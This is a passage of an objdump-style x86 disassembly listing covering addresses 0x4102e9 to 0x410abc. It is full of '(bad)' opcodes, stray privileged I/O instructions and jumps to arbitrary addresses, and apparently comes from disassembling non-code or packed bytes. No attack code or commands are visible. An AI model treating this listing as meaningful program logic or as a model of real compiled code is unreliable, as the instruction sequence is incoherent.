  4102e9:	mov    esp,0xd889ac4e
  4102ee:	jge    0x41036b
  4102f0:	retf   
  4102f1:	cwde   
  4102f2:	dec    esp
  4102f3:	(bad)  
  4102f4:	sub    dh,al
  4102f6:	frstpm(287 only) 
  4102f8:	inc    edi
  4102f9:	jo     0x4102ab
  4102fb:	cld    
  4102fc:	jmp    0xa9d64b6c
  410301:	imul   ebx,DWORD PTR [ecx],0xfffffff2
  410304:	mov    dh,0x75
  410306:	cld    
  410307:	push   esp
  410308:	pop    esi
  410309:	sub    eax,0x2ac6606f
  41030e:	jns    0x41029c
  410310:	jo     0x4102d2
  410312:	push   DWORD PTR [edi]
  410314:	int    0xf9
  410316:	rcl    BYTE PTR [edi-0x58],cl
  410319:	popf   
  41031a:	jnp    0x410323
  41031c:	fwait
  41031d:	sti    
  41031e:	repnz scas eax,DWORD PTR es:[edi]
  410320:	adc    ebp,0x1c0d5deb
  410326:	add    al,0x46
  410328:	or     BYTE PTR [esi-0x47f2df09],dh
  41032e:	and    eax,ecx
  410330:	nop
  410331:	retf   0xa5e3
  410334:	pop    ds
  410335:	test   al,0xce
  410337:	mov    WORD PTR [esi-0x37],ss
  41033a:	pop    ss
  41033b:	aaa    
  41033c:	mov    DWORD PTR [eax+eax*4+0x7864e12e],edi
  410343:	mov    eax,0x8005bc33
  410348:	pop    eax
  410349:	xchg   ebx,eax
  41034a:	(bad)  
  41034b:	data16 fsubr QWORD PTR [ebp-0x69]
  41034f:	out    0x8f,al
  410351:	fucom  st(0)
  410353:	(bad)  
  410354:	sub    ebp,DWORD PTR [ebx+0x1eef193e]
  41035a:	je     0x4103a4
  41035c:	pop    ebp
  41035d:	push   cs
  41035e:	lods   eax,DWORD PTR ds:[esi]
  41035f:	push   edi
  410360:	add    eax,0x3ee28fde
  410365:	outs   dx,BYTE PTR ds:[esi]
  410366:	loop   0x4103e5
  410368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410369:	pop    ecx
  41036a:	add    cl,BYTE PTR [ebx+0x6835698b]
  410370:	cmc    
  410371:	push   ecx
  410372:	mov    edi,0xce2e38a3
  410377:	loop   0x41036b
  410379:	xlat   BYTE PTR ds:[ebx]
  41037a:	scas   eax,DWORD PTR es:[edi]
  41037b:	inc    esp
  41037c:	xor    al,0x26
  41037e:	sbb    cl,dl
  410380:	cmp    bl,BYTE PTR es:[edx+ebp*8]
  410384:	pusha  
  410385:	jb     0x410352
  410387:	push   esi
  410388:	jbe    0x4103b3
  41038a:	inc    ebx
  41038b:	pop    ds
  41038c:	cmp    DWORD PTR [esi-0x19],esp
  41038f:	sub    BYTE PTR [edi+0x6e73021d],cl
  410395:	cdq    
  410396:	imul   edx,ecx,0x1230a647
  41039c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41039d:	in     al,dx
  41039e:	aam    0x35
  4103a0:	add    eax,DWORD PTR [edi+0x5ae2cfdf]
  4103a6:	inc    esi
  4103a7:	sti    
  4103a8:	sub    dl,BYTE PTR es:[ecx-0x401000db]
  4103af:	arpl   WORD PTR [edx-0x618ee20a],bx
  4103b5:	and    BYTE PTR [esi+0x7],dl
  4103b8:	pop    eax
  4103b9:	je     0x410348
  4103bb:	sbb    BYTE PTR [esi+0x1828291d],bh
  4103c1:	xchg   ecx,eax
  4103c2:	jns    0x41042d
  4103c4:	in     eax,0xa2
  4103c6:	out    0x26,eax
  4103c8:	cmp    eax,0xabe65a36
  4103cd:	in     al,dx
  4103ce:	adc    BYTE PTR [eax],bh
  4103d0:	push   esp
  4103d1:	dec    ebx
  4103d2:	in     al,dx
  4103d3:	add    DWORD PTR [ebx+0x3b],eax
  4103d6:	mov    edx,0xdf89a6dc
  4103db:	sbb    edi,DWORD PTR [esi-0x490e1f93]
  4103e1:	imul   ebx,ecx,0x2d
  4103e4:	inc    edi
  4103e5:	jo     0x41040b
  4103e7:	jb     0x410431
  4103e9:	pop    eax
  4103ea:	mov    ecx,0x3744ddd8
  4103ef:	je     0x41041e
  4103f1:	sbb    esi,esp
  4103f3:	(bad)  
  4103f4:	mov    cl,0x26
  4103f6:	mov    esp,DWORD PTR [eax-0x48]
  4103f9:	add    DWORD PTR [esi],edi
  4103fb:	out    dx,al
  4103fc:	mov    al,ds:0xd9f86d72
  410401:	clc    
  410402:	push   edi
  410403:	cmp    eax,0xf9c631fe
  410408:	add    esi,DWORD PTR [edx]
  41040a:	leave  
  41040b:	pop    edx
  41040c:	addr16 cli 
  41040e:	pop    ebx
  41040f:	inc    edi
  410410:	test   DWORD PTR [ebp+esi*8+0x3d93284f],edx
  410417:	pop    ebp
  410418:	and    ebp,DWORD PTR [ecx+0x5f]
  41041b:	das    
  41041c:	xchg   esi,eax
  41041d:	pop    ebx
  41041e:	sbb    esp,DWORD PTR [edx+ebx*1]
  410421:	addr16 xor dh,ch
  410424:	adc    BYTE PTR [ebx],dl
  410426:	push   ebp
  410427:	std    
  410428:	push   ecx
  410429:	popa   
  41042a:	inc    ebx
  41042b:	shl    bh,0x7e
  41042e:	or     eax,0xff671066
  410433:	mov    ebp,edx
  410435:	sbb    al,0xbe
  410437:	pop    ebp
  410438:	xchg   ecx,eax
  410439:	xor    al,0x40
  41043b:	mov    al,BYTE PTR [ebp-0x3]
  41043e:	inc    ebp
  41043f:	pop    ds
  410440:	jle    0x410484
  410442:	ror    bl,0x9
  410445:	xor    al,0x8a
  410447:	cwde   
  410448:	jmp    0x847f9930
  41044d:	pop    ecx
  41044e:	mov    eax,0x3e6649c3
  410453:	inc    ebp
  410454:	dec    ebx
  410455:	xchg   ebp,eax
  410456:	sub    BYTE PTR [ebp-0x6e],ah
  410459:	lods   eax,DWORD PTR ds:[esi]
  41045a:	lea    edi,[esi]
  41045c:	push   0x48
  41045e:	mov    bh,0x26
  410460:	xchg   edi,eax
  410461:	adc    cl,dh
  410463:	inc    esp
  410464:	jg     0x4104af
  410466:	repz (bad)
  410469:	sti    
  41046a:	cmp    eax,0x4fe7b7ed
  41046f:	mov    ah,ah
  410471:	inc    edi
  410472:	pop    ds
  410473:	out    0x26,al
  410475:	push   ecx
  410476:	ja     0x410401
  410478:	daa    
  410479:	(bad)  
  41047a:	cmp    BYTE PTR [bp-0x72],bl
  41047e:	test   bh,bh
  410480:	int3   
  410481:	add    BYTE PTR ss:[edx-0x29b7b392],bh
  410488:	mov    bh,0x69
  41048a:	adc    eax,0xb524bd13
  41048f:	loopne 0x41045d
  410491:	std    
  410492:	aad    0x3d
  410494:	ret    
  410495:	jne    0x410471
  410497:	(bad)
  41049b:	out    0xc0,eax
  41049d:	push   ebx
  41049e:	ror    BYTE PTR [esi+eiz*1],cl
  4104a1:	push   ecx
  4104a2:	not    BYTE PTR [ebp-0x10]
  4104a5:	xlat   BYTE PTR ds:[ebx]
  4104a6:	mov    esi,edi
  4104a8:	ror    DWORD PTR [esi+0x7e9b2e03],cl
  4104ae:	pop    esp
  4104af:	sbb    esp,ebp
  4104b1:	shl    DWORD PTR [ebx-0x50],0xc8
  4104b5:	sbb    BYTE PTR [esi-0x71],bl
  4104b8:	fs cwde 
  4104ba:	sub    al,0x83
  4104bc:	aam    0x27
  4104be:	jne    0x4104d8
  4104c0:	hlt    
  4104c1:	inc    eax
  4104c2:	xor    al,0x21
  4104c4:	push   ebx
  4104c5:	dec    esi
  4104c6:	cli    
  4104c7:	test   al,0x8e
  4104c9:	xor    ah,dl
  4104cb:	mov    ch,0x7b
  4104cd:	packsswb mm2,QWORD PTR [edx+edx*8]
  4104d1:	(bad)  
  4104d2:	jmp    0x410498
  4104d4:	sub    eax,0x4d6e1f8a
  4104d9:	add    DWORD PTR [edi-0x5a],0x69
  4104dd:	test   DWORD PTR [ebx],ecx
  4104df:	push   esp
  4104e0:	mov    ecx,0x28f6ecd0
  4104e5:	pop    ebp
  4104e6:	cmp    dl,al
  4104e8:	mov    dh,0x90
  4104ea:	pop    es
  4104eb:	adc    eax,0x33ff9c80
  4104f0:	pushf  
  4104f1:	js     0x4104b9
  4104f3:	xchg   ebp,eax
  4104f4:	mov    ebx,0x2a927e7a
  4104f9:	jae    0x410513
  4104fb:	xchg   ebx,eax
  4104fc:	add    DWORD PTR [esi-0x35],ecx
  4104ff:	sub    edx,DWORD PTR [esp+ebp*4]
  410502:	arpl   sp,bp
  410504:	fyl2x  
  410506:	cdq    
  410507:	sub    esi,DWORD PTR [esi-0x133954f0]
  41050d:	mov    esp,0x2324df9a
  410512:	mov    BYTE PTR [eax+ebp*1-0x2fb075b9],cl
  410519:	stos   DWORD PTR es:[edi],eax
  41051a:	scas   al,BYTE PTR es:[edi]
  41051b:	push   ds
  41051c:	xor    BYTE PTR [edi-0x58],dl
  41051f:	ja     0x4104ff
  410521:	jbe    0x4104a5
  410523:	lock sahf 
  410525:	pop    ss
  410526:	ficom  WORD PTR ds:0xc3aa7a1f
  41052c:	xchg   esp,eax
  41052d:	call   DWORD PTR [edx+0x72]
  410530:	fs sub cl,bl
  410533:	cmc    
  410534:	mov    esi,0xeab287ba
  410539:	xchg   esi,eax
  41053a:	fs xchg edi,eax
  41053c:	cmp    eax,0xa0cadf73
  410541:	dec    ecx
  410542:	aam    0xf9
  410544:	in     al,0xce
  410546:	pushf  
  410547:	and    edi,eax
  410549:	adc    eax,0x6c2a6d50
  41054e:	mov    al,ds:0x7df6aa0e
  410553:	mov    DWORD PTR [ecx+0x522411c0],esi
  410559:	in     eax,dx
  41055a:	out    0xae,al
  41055c:	in     al,dx
  41055d:	(bad)  
  41055e:	(bad)  
  41055f:	fucomp st(0)
  410561:	jg     0x4104e3
  410563:	jecxz  0x410507
  410565:	xlat   BYTE PTR ds:[ebx]
  410566:	push   0xffffffba
  410568:	mov    WORD PTR [eax-0x36e75669],?
  41056e:	(bad)  
  410570:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  410572:	jp     0x4105a9
  410574:	adc    eax,0x309447b2
  410579:	sahf   
  41057a:	xchg   ecx,eax
  41057b:	addr16 xchg esp,eax
  41057d:	adc    al,0xc6
  41057f:	arpl   WORD PTR [esi],di
  410581:	push   0x37bdc845
  410586:	add    DWORD PTR [edi],0xffffffa7
  410589:	stc    
  41058a:	std    
  41058b:	xchg   BYTE PTR [eax],ch
  41058d:	arpl   WORD PTR [eax+0x2a],si
  410590:	pop    esi
  410591:	loop   0x4105fa
  410593:	xchg   edi,eax
  410594:	shr    BYTE PTR [ebx],0xcc
  410597:	loop   0x4105d6
  410599:	mov    ah,0x33
  41059b:	aas    
  41059c:	call   0xf84e:0x5666d918
  4105a3:	inc    edx
  4105a4:	sbb    al,0x74
  4105a6:	dec    esi
  4105a7:	fsubr  st,st(0)
  4105a9:	mov    ecx,0xa9c2c4c5
  4105ae:	xchg   edx,eax
  4105af:	push   ebx
  4105b0:	and    cl,cl
  4105b2:	adc    BYTE PTR [ebp+ebx*8+0xc],0xab
  4105b7:	cmp    BYTE PTR [ecx],bl
  4105b9:	js     0x410613
  4105bb:	mov    bl,0x25
  4105bd:	retf   0x528d
  4105c0:	push   ecx
  4105c1:	push   ss
  4105c2:	inc    edi
  4105c3:	test   al,0x5f
  4105c5:	cmp    eax,eax
  4105c7:	pushf  
  4105c8:	shr    BYTE PTR [eax-0x11b328dc],1
  4105ce:	lods   al,BYTE PTR ds:[esi]
  4105cf:	add    ebp,DWORD PTR [ebx]
  4105d1:	jmp    0xbde63824
  4105d6:	mov    ebp,eax
  4105d8:	sbb    eax,0x72a53af9
  4105dd:	fcomip st,st(3)
  4105df:	popa   
  4105e0:	jp     0x41065e
  4105e2:	imul   ebx,esi,0x52a0f625
  4105e8:	or     ebp,ebp
  4105ea:	xor    BYTE PTR [ecx-0x36],cl
  4105ed:	rol    DWORD PTR ds:0xc757e18a,0xab
  4105f4:	sbb    DWORD PTR [ecx],esp
  4105f6:	sub    esp,DWORD PTR [esi-0x7a338f05]
  4105fc:	adc    eax,0x3cc01dd4
  410601:	cmp    BYTE PTR [ebp+0x7],0x7
  410605:	add    DWORD PTR [ecx+0x5ebf068],eax
  41060b:	add    al,0xdb
  41060d:	fstp   TBYTE PTR ds:[edx-0x24]
  410611:	sbb    edi,DWORD PTR [ebp+0x42bec01a]
  410617:	mov    esp,0xa79cc155
  41061c:	or     eax,DWORD PTR [ecx+eiz*1+0x1c]
  410620:	hlt    
  410621:	pop    esp
  410622:	in     eax,dx
  410623:	xor    BYTE PTR [edx+0x42],0x41
  410627:	and    eax,0x6c0e1d4e
  41062c:	and    eax,0xdc393dcc
  410631:	inc    eax
  410632:	je     0x4105ba
  410634:	sbb    eax,0xfe83a673
  410639:	repnz mov esi,fs
  41063c:	pop    ebx
  41063d:	mov    cl,0x27
  41063f:	arpl   WORD PTR [edx],ax
  410641:	in     eax,0x8c
  410643:	jne    0x410631
  410645:	jo     0xc77236ba
  41064b:	fcomp  DWORD PTR [eax-0x5d]
  41064e:	outs   dx,BYTE PTR ds:[esi]
  41064f:	adc    esp,DWORD PTR [esi-0x64a707f5]
  410655:	dec    edi
  410656:	int    0x83
  410658:	fwait
  410659:	xor    ebx,esi
  41065b:	lds    ecx,FWORD PTR [edx-0x60]
  41065e:	stos   BYTE PTR es:[edi],al
  41065f:	mov    BYTE PTR [edi+0x601b4053],bl
  410665:	(bad)  
  410666:	out    dx,eax
  410667:	xchg   esi,eax
  410668:	inc    esp
  410669:	pushf  
  41066a:	inc    ebp
  41066b:	hlt    
  41066c:	xchg   edx,eax
  41066d:	sbb    al,0x86
  41066f:	jp     0x4105f4
  410671:	(bad)  
  410673:	mov    dh,0x3a
  410675:	jno    0x4106e2
  410677:	in     eax,0x7a
  410679:	dec    edi
  41067a:	xor    ecx,DWORD PTR [ebx]
  41067c:	imul   ecx,esi,0xffffff96
  41067f:	push   cs
  410680:	fsub   st,st(1)
  410682:	jb     0x87c27bc0
  410688:	mov    al,ds:0xcd754e68
  41068d:	loop   0x41069f
  41068f:	adc    ch,ah
  410691:	xor    al,0x54
  410693:	jno    0x410710
  410695:	lock xchg edi,eax
  410697:	(bad)  
  410698:	imul   ebx,DWORD PTR [edx],0xffffff93
  41069b:	ror    BYTE PTR [eax+0x20],0x3f
  41069f:	popf   
  4106a0:	daa    
  4106a1:	sbb    eax,0xef00dd57
  4106a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106a7:	sbb    DWORD PTR [esi],0xc6a06205
  4106ad:	lea    ecx,[ecx]
  4106af:	and    ah,cl
  4106b1:	ins    DWORD PTR es:[edi],dx
  4106b2:	push   edx
  4106b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106b4:	nop
  4106b5:	dec    eax
  4106b6:	sub    DWORD PTR [ecx],0xffffffd2
  4106b9:	xor    dh,BYTE PTR [ecx]
  4106bb:	or     bl,BYTE PTR [ebp-0x27f25ac8]
  4106c1:	fsub   st,st(5)
  4106c3:	aam    0xca
  4106c5:	lods   al,BYTE PTR ds:[esi]
  4106c6:	loop   0x41067a
  4106c8:	in     al,0xe9
  4106ca:	cmc    
  4106cb:	iret   
  4106cc:	scas   al,BYTE PTR es:[edi]
  4106cd:	jns    0x4106c6
  4106cf:	mov    edx,0xb1ec66db
  4106d4:	int    0xe0
  4106d6:	(bad)  
  4106d7:	pop    edi
  4106d8:	fimul  WORD PTR [esi]
  4106da:	adc    al,0x4f
  4106dc:	rcl    BYTE PTR [eax-0x1d6202e6],1
  4106e2:	int3   
  4106e3:	hlt    
  4106e4:	push   ebx
  4106e5:	clc    
  4106e6:	xor    edx,0xffffff9a
  4106e9:	cdq    
  4106ea:	out    dx,al
  4106eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106ec:	dec    BYTE PTR [edi+0x574375b1]
  4106f2:	or     eax,0xe5e76661
  4106f7:	stos   DWORD PTR es:[edi],eax
  4106f8:	xor    ebp,DWORD PTR [ecx]
  4106fa:	xchg   edx,eax
  4106fb:	add    eax,0xd007d53a
  410700:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410701:	mov    ah,0x8c
  410703:	in     al,0xfc
  410705:	push   ebp
  410706:	xor    DWORD PTR [ebx-0x52ead9a],ebp
  41070c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41070d:	enter  0x6a38,0x8b
  410711:	jnp    0x4106c9
  410713:	imul   edi,DWORD PTR [ebx],0xffffff8c
  410716:	sub    dh,bl
  410718:	out    0x44,al
  41071a:	bound  eax,QWORD PTR [eax]
  41071c:	pop    edi
  41071d:	or     esp,DWORD PTR [esp+eax*1]
  410720:	adc    DWORD PTR [ebx-0x67824d66],0x1a8d1a73
  41072a:	pop    ss
  41072b:	pop    esp
  41072c:	les    ebx,FWORD PTR ds:0xb434661f
  410732:	mov    esi,0x3893b732
  410737:	and    ch,BYTE PTR [edi]
  410739:	(bad)  
  41073a:	leave  
  41073b:	sub    eax,0x71f79255
  410740:	xor    BYTE PTR [edi-0x17049856],dl
  410746:	push   ecx
  410747:	enter  0x51ad,0x87
  41074b:	pop    edx
  41074c:	inc    esp
  41074d:	add    esp,ebp
  41074f:	adc    ah,ah
  410751:	nop
  410752:	cmp    eax,0xb804c5dc
  410757:	pop    ds
  410758:	adc    dl,dh
  41075a:	popa   
  41075b:	mov    dl,0xb
  41075d:	inc    esp
  41075e:	mov    eax,0x2bcb3764
  410763:	mov    edi,0x53d7e37b
  410768:	jge    0x410722
  41076a:	mov    dh,0x8
  41076c:	es mov edi,0xa0d76e79
  410772:	bound  ebx,QWORD PTR [ebx-0x1f]
  410775:	cdq    
  410776:	push   esi
  410777:	pop    ebp
  410778:	sbb    bh,bl
  41077a:	cmc    
  41077b:	scas   ax,WORD PTR es:[edi]
  41077d:	idiv   DWORD PTR [edi+eax*1]
  410780:	pop    es
  410781:	sub    BYTE PTR [ecx-0x61],dh
  410784:	clc    
  410785:	sub    BYTE PTR [ebx+0x4928116],al
  41078b:	push   edx
  41078c:	sub    ebx,DWORD PTR [edi-0x7f74d103]
  410792:	dec    ebp
  410793:	xor    cl,BYTE PTR [ebx]
  410795:	inc    edi
  410796:	stos   BYTE PTR es:[edi],al
  410797:	les    ecx,FWORD PTR [edx]
  410799:	mov    cl,0x32
  41079b:	(bad)  
  41079c:	test   al,0x53
  41079e:	dec    edx
  41079f:	(bad)  [edx]
  4107a1:	ins    DWORD PTR es:[edi],dx
  4107a2:	dec    esi
  4107a3:	(bad)  [eax+0xd5ba597]
  4107a9:	jge    0x41073f
  4107ab:	int    0xbe
  4107ad:	stos   BYTE PTR es:[edi],al
  4107ae:	iret   
  4107af:	pop    edx
  4107b0:	loope  0x41080a
  4107b2:	xchg   esp,eax
  4107b3:	sbb    DWORD PTR [ebp+0x1b],esp
  4107b6:	imul   edi,DWORD PTR ds:0x8069b92b,0xf07df0e6
  4107c0:	xchg   ebp,eax
  4107c1:	out    dx,al
  4107c2:	cdq    
  4107c3:	jp     0x4107a4
  4107c5:	inc    ecx
  4107c6:	push   es
  4107c7:	dec    ecx
  4107c8:	xchg   DWORD PTR [esi-0x79],ebx
  4107cb:	add    DWORD PTR fs:[esp+eax*8+0xb24a10e],0xffffffd2
  4107d4:	int    0x76
  4107d6:	mov    BYTE PTR [ebx-0x2e4c3897],bl
  4107dc:	fnsave [ebx+0x1deb6042]
  4107e2:	lock aas 
  4107e4:	mov    eax,ds:0xfa497839
  4107e9:	(bad)  
  4107ea:	das    
  4107eb:	sar    BYTE PTR [edx],0xcc
  4107ee:	call   0xcc6acb4
  4107f3:	es retf 
  4107f5:	setl   BYTE PTR [eax+0x559ac920]
  4107fc:	push   ss
  4107fd:	and    ebx,esi
  4107ff:	cdq    
  410800:	or     esp,ebp
  410802:	test   DWORD PTR [ecx],edx
  410804:	cdq    
  410805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410806:	push   es
  410807:	outs   dx,BYTE PTR ds:[esi]
  410808:	or     esi,DWORD PTR [eax+0x39]
  41080b:	push   eax
  41080c:	mov    esi,0xcb0791cd
  410811:	mov    edi,0x18d4cfc4
  410816:	fmul   DWORD PTR [edx+edi*8-0x341ff3e0]
  41081d:	in     al,dx
  41081e:	jp     0x4107c5
  410820:	into   
  410821:	loop   0x4107da
  410823:	push   0xffffffbd
  410825:	push   ds
  410826:	lahf   
  410827:	inc    esp
  410828:	xor    DWORD PTR [edi+0x3fb0b531],esi
  41082e:	lock push ecx
  410830:	mov    ecx,0xdac570ba
  410835:	add    al,0xcc
  410837:	pop    ss
  410838:	ins    BYTE PTR es:[edi],dx
  410839:	outs   dx,DWORD PTR ds:[esi]
  41083a:	push   edx
  41083b:	xchg   ecx,ecx
  41083d:	test   al,0xd
  41083f:	daa    
  410840:	retf   
  410841:	xchg   esi,eax
  410842:	dec    eax
  410843:	mov    ebx,0xbc7b9714
  410848:	loope  0x410813
  41084a:	jns    0x410808
  41084c:	mov    bh,0xfd
  41084e:	repz jb 0x4107f7
  410851:	ret    
  410852:	mov    ah,BYTE PTR [edx+0x18]
  410855:	cmp    BYTE PTR [ecx+ebx*1],al
  410858:	jmp    0x410800
  41085a:	jle    0x41081e
  41085c:	push   cs
  41085d:	outs   dx,DWORD PTR ds:[esi]
  41085e:	push   esp
  41085f:	(bad)  
  410860:	ins    BYTE PTR es:[edi],dx
  410861:	cmp    ecx,eax
  410863:	ficomp WORD PTR [ecx]
  410865:	pop    esp
  410866:	jne    0x4108b9
  410868:	mov    ebx,eax
  41086a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41086b:	addr16 leave 
  41086d:	test   eax,0x2af2f3b1
  410872:	sahf   
  410873:	(bad)  
  410874:	cli    
  410875:	sahf   
  410876:	clc    
  410877:	jmp    0x4108c4
  410879:	jns    0x410854
  41087b:	ins    BYTE PTR es:[edi],dx
  41087c:	xor    DWORD PTR [ebx-0x3afa177c],ebx
  410882:	loope  0x410826
  410884:	dec    ebx
  410885:	xchg   esp,eax
  410886:	pushf  
  410887:	adc    dh,cl
  410889:	scas   eax,DWORD PTR es:[edi]
  41088a:	or     DWORD PTR [ebp+esi*2+0x56f30000],0xffffff9c
  410892:	pop    ds
  410893:	bound  eax,QWORD PTR cs:[ecx]
  410896:	inc    ecx
  410897:	data16 (bad) 
  410899:	fmulp  st(1),st
  41089b:	jge    0x4108e5
  41089d:	fnsave [ebp+0x0]
  4108a0:	jle    0x4108db
  4108a2:	dec    eax
  4108a3:	push   ebp
  4108a4:	cmp    BYTE PTR [esi-0x5da510f6],bl
  4108aa:	or     bh,BYTE PTR [ebp-0x54644e3b]
  4108b0:	sub    DWORD PTR [ebp+0x35],0xdc46b51f
  4108b7:	push   0xe11fe2ac
  4108bc:	(bad)  
  4108bd:	cmp    al,0xb1
  4108bf:	fs sub ch,bl
  4108c2:	add    BYTE PTR [edi],ch
  4108c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108c5:	into   
  4108c6:	test   DWORD PTR [esi+0x592d7ada],edx
  4108cc:	jl     0x410887
  4108ce:	loop   0x4108da
  4108d0:	dec    eax
  4108d1:	sbb    eax,0x6a5d84d0
  4108d6:	adc    dh,BYTE PTR ds:0x68847d16
  4108dc:	add    DWORD PTR [ebx],esp
  4108de:	mov    edx,0xe41a8cd9
  4108e3:	sahf   
  4108e4:	cmp    BYTE PTR ds:0x4c602f6c,ah
  4108ea:	xlat   BYTE PTR ds:[ebx]
  4108eb:	sub    BYTE PTR [esi-0x63],dh
  4108ee:	push   ecx
  4108ef:	ror    DWORD PTR [ecx-0x5e2ebe00],0xf3
  4108f6:	mov    dh,0xb3
  4108f8:	sbb    eax,0xb8e37fc6
  4108fd:	stos   BYTE PTR es:[edi],al
  4108fe:	outs   dx,BYTE PTR ds:[esi]
  4108ff:	out    dx,al
  410900:	push   eax
  410901:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410902:	pop    es
  410903:	cmp    eax,DWORD PTR [edx]
  410905:	ret    0x7cd
  410908:	sbb    BYTE PTR [edi+0x36d801e6],dh
  41090e:	jb     0x4108ba
  410910:	(bad)  
  410911:	and    dl,BYTE PTR [ecx]
  410913:	rcr    BYTE PTR [edx-0x7e5c60ee],1
  410919:	sbb    DWORD PTR [ebx-0x24],edi
  41091c:	(bad)  
  41091d:	xor    DWORD PTR ss:[eax+ebx*8+0x787b6907],eax
  410925:	loope  0x410981
  410927:	mov    ecx,0x7dc83fcf
  41092c:	and    ebx,esi
  41092e:	and    ebx,DWORD PTR [eax+0x57f215f3]
  410934:	adc    eax,0x53cd091
  410939:	rcl    BYTE PTR [esi-0x35c2bcb3],0xe3
  410940:	aaa    
  410941:	pop    edi
  410942:	int    0x32
  410944:	xor    eax,DWORD PTR [eax+0x6ffbcf87]
  41094a:	jp     0x410995
  41094c:	out    0xf6,eax
  41094e:	cmp    BYTE PTR [edx-0x48],bl
  410951:	mov    eax,0x765ec070
  410956:	js     0x410949
  410958:	icebp  
  410959:	mov    fs,WORD PTR [eax]
  41095b:	in     al,dx
  41095c:	xor    esi,esp
  41095e:	pushf  
  41095f:	loope  0x410983
  410961:	fsubr  QWORD PTR [ebp+0x41]
  410964:	aad    0x62
  410966:	adc    BYTE PTR [ebx-0x5d1fcc52],ch
  41096c:	jge    0x41097e
  41096e:	push   ss
  41096f:	ja     0x410941
  410971:	cli    
  410972:	xchg   edx,eax
  410973:	inc    esp
  410974:	dec    esi
  410975:	sub    al,0x58
  410977:	jo     0x410940
  410979:	lods   eax,DWORD PTR ds:[esi]
  41097a:	sub    al,0x3f
  41097c:	and    eax,0x1d8e8cb4
  410981:	jae    0x41090c
  410983:	scas   al,BYTE PTR es:[edi]
  410984:	aad    0xc5
  410986:	mov    ebp,0x27b1a060
  41098b:	fist   WORD PTR [ebx]
  41098d:	xlat   BYTE PTR ds:[ebx]
  41098e:	sub    al,0x7c
  410991:	add    BYTE PTR [ecx+edx*2+0x32],0x99
  410996:	into   
  410997:	xchg   edx,eax
  410998:	adc    eax,0x466a87d
  41099d:	sar    DWORD PTR [esi+0x4f76ce44],0xb3
  4109a4:	mov    al,ds:0x18f79527
  4109a9:	jns    0x4109c6
  4109ab:	in     al,dx
  4109ac:	xor    al,0x8a
  4109ae:	xchg   ecx,eax
  4109af:	cmp    edi,DWORD PTR [ecx+ebp*4]
  4109b2:	xchg   esp,eax
  4109b3:	or     al,0x16
  4109b5:	je     0x4109c2
  4109b7:	in     eax,dx
  4109b8:	mov    ds:0xe42d2db3,al
  4109bd:	and    BYTE PTR [eax+0x6d7f30f6],ah
  4109c3:	push   esp
  4109c4:	inc    edi
  4109c5:	(bad)  
  4109c6:	gs push ecx
  4109c8:	xor    DWORD PTR [ebp+edx*2+0x43],ebx
  4109cc:	push   0x11
  4109ce:	jne    0x410a02
  4109d0:	mov    eax,ds:0xe4aff0fc
  4109d5:	mov    ch,0x4f
  4109d7:	sub    al,0x45
  4109d9:	repz cmp eax,0x62d51e04
  4109df:	add    al,0x42
  4109e1:	jg     0x410a22
  4109e3:	and    esi,edi
  4109e5:	adc    DWORD PTR [edx-0x7c6ed5b6],edx
  4109eb:	cdq    
  4109ec:	sbb    eax,0x37da1738
  4109f1:	xor    al,0xbf
  4109f3:	imul   ebp,DWORD PTR [esi-0xa194e87],0x9f6566be
  4109fd:	and    BYTE PTR [esi],bl
  4109ff:	(bad)  
  410a00:	jmp    0x30c8a16d
  410a05:	sub    ebx,DWORD PTR [edi]
  410a07:	call   0xa999:0x13ae8275
  410a0e:	rcl    DWORD PTR [eax+0x66dc00b5],1
  410a14:	retf   
  410a15:	enter  0x430c,0x38
  410a19:	call   0x995639bc
  410a1e:	or     eax,0x844f4517
  410a23:	enter  0x210f,0x24
  410a27:	lahf   
  410a28:	sbb    ch,cl
  410a2a:	enter  0x752f,0x4e
  410a2e:	mov    esp,0x114f2f61
  410a33:	dec    ebx
  410a34:	xchg   ebx,eax
  410a35:	int    0x13
  410a37:	inc    ebp
  410a38:	test   DWORD PTR [eax-0x74450322],edi
  410a3e:	xchg   esp,eax
  410a3f:	or     al,0x22
  410a41:	xchg   ebx,eax
  410a42:	pushf  
  410a43:	inc    edx
  410a44:	push   ds
  410a45:	daa    
  410a46:	neg    bl
  410a48:	mov    eax,0x6373de75
  410a4d:	mov    eax,0xa9761c34
  410a52:	ret    
  410a53:	cwde   
  410a54:	add    ebp,DWORD PTR [eax+0x1c]
  410a57:	dec    esi
  410a58:	sub    DWORD PTR [ebp+0x45e00c07],edi
  410a5e:	mov    edx,0x95d8b7d0
  410a63:	stos   DWORD PTR es:[edi],eax
  410a64:	mov    ax,ds:0x592cbff8
  410a6a:	mov    edx,0x6008a926
  410a6f:	inc    esi
  410a70:	icebp  
  410a71:	pusha  
  410a72:	adc    esp,DWORD PTR [esi+0x73]
  410a75:	lods   eax,DWORD PTR ds:[esi]
  410a76:	adc    ah,0x31
  410a79:	jnp    0x410a32
  410a7b:	(bad)  
  410a7d:	cs daa 
  410a7f:	push   ss
  410a80:	jmp    0x410ad7
  410a82:	push   eax
  410a83:	lea    esp,[edx]
  410a85:	ss call 0xcd5f:0x558e0ba
  410a8d:	inc    edi
  410a8e:	dec    DWORD PTR [ecx+0x3e]
  410a91:	pop    ss
  410a92:	aad    0x43
  410a94:	cdq    
  410a95:	push   ecx
  410a96:	leave  
  410a97:	out    dx,eax
  410a98:	xchg   esp,eax
  410a99:	jns    0x410ae3
  410a9b:	(bad)  
  410a9c:	test   DWORD PTR [esi+0x7a368497],0x5d93a186
  410aa6:	ret    
  410aa7:	cmp    DWORD PTR [esp+esi*4-0x7],ecx
  410aab:	mov    esp,0xdb92743c
  410ab0:	ror    DWORD PTR ds:0x17343537,0xc0
  410ab7:	out    0xb5,eax
  410ab9:	fwait
  410aba:	pop    ds
  410abb:	pop    edi
  410abc:	outs   dx,DWORD PTR ds:[esi]
